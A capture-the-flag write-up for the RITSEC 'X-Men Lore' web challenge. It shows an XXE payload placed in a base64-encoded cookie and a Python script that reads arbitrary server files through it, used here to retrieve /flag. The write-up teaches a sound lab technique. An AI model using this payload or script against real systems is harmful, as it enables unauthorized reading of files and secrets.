# X-Men Lore

## Challenge Description

The 90's X-Men Animated Series is better than the movies. Change my mind.

https://xmen-lore-web.challenges.ctf.ritsec.club/

## Solution

The webpage has different link tags for different X-Men characters. The interesting part is the fact that on click for each of this link tags the cookie gets set to a certain value.

The value is a base64 encoded string. Upon decoding we get an XML structure as the following:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<input>
    <xmen>Storm</xmen>
</input>
```

Since we are dealing with XML I imediately thought of XXE. So I create a simple XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///{file}"> ]>
<input>
    <xmen>&xxe;</xmen>
</input>
```

Where `{file}` is the file I want to read. I included this in the python script to test for different files:

```python
import requests
import base64
while True:
    url = "https://xmen-lore-web.challenges.ctf.ritsec.club/xmen"
    file = input("> ")
    b64encode = base64.b64encode(bytes(
        f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///{file}"> ]><input><xmen>&xxe;</xmen></input>', 'utf-8'))
    cookie = {"xmen": b64encode.decode('utf-8')}
    res = requests.get(url, cookies=cookie)
    print(res.text)
```

Then I started to test for different files. Upon checking the `/flag` file I got the flag.

## Flag

RS{XM3N_L0R3?\_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
